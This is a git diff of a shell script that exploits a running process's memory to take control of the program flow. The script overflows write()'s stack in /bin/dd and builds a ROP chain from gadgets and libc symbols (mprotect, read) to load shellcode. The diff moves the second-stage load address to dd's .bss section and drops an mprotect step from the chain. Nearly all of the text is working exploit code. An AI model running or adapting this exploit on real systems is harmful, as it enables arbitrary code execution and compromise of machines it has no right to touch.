@@ -1,14 +1,11 @@
 #!/bin/sh
 
-# A long filename may shift the stack too much which may oblige to lower the
-# `write_to_addr' variable.
+# A _very_ long filename may shift the stack too much which and oblige to lower
+# the `write_to_addr' variable.
 filename=/bin/dd
 # Position in the stack we start to overwrite. We are trying to overflow
 # write()'s stack and take control from there.
 write_to_addr=$((0x7fffffffe000))
-
-# Address where to load the first stage (must be initially mapped)
-base_addr=0000555555555000
 
 # Prepend the shellcode with an infinite loop (so I can attach to it with gdb)
 # Then in gdb just use `set *(short*)$pc=0x9090' and you will be able to `si'
@@ -114,7 +111,6 @@ search_section()
     done
 }
 # search_symbol $filename $symbol1 $symbol2
-# (the slowest part of this script, with difference)
 search_symbol()
 {
     local strtab_off=$(search_section file $1 .dynstr)
@@ -210,7 +206,6 @@ craft_rop()
     local ret=$(find_gadget $text $text_off $dd_base "c3")
     local map_size=$(((0x$1 & (~0xfff)) + 0x1000))
     map_size=$(endian $(printf %016x $map_size))
-    base_addr=$(endian $base_addr)
 
     # Find address of mprotect() and read() in the libc
     local mprotect_offset=$(search_symbol $libc_path mprotect read)
@@ -222,14 +217,6 @@ craft_rop()
     read_addr=$(endian $(printf "%016x" $read_addr))
 
     local rop=""
-    rop=$rop$pop_rdi
-    rop=$rop$base_addr
-    rop=$rop$pop_rsi
-    rop=$rop$map_size
-    rop=$rop$pop_rdx
-    rop=$rop"0300000000000000" # RW
-    rop=$rop$mprotect_addr
-
     rop=$rop$pop_rdi
     rop=$rop"0000000000000000"
     rop=$rop$pop_rsi
@@ -318,6 +305,11 @@ else # System with musl
     libc_path=$($interp --list $filename | grep libc)
     libc_path=$(echo $libc_path | cut -d' ' -f3)
 fi
+
+# We will load the second stage (shellcode) in the .bss of dd
+base_addr=$(search_section file $filename .bss | cut -d' ' -f3)
+base_addr=$(((base_addr + 0x$dd_base) & (~0xfff)))
+base_addr=$(endian $(printf %016x $base_addr))
 
 ## 1st payload: Craft the ROP
 rop=$(craft_rop $sc_len)
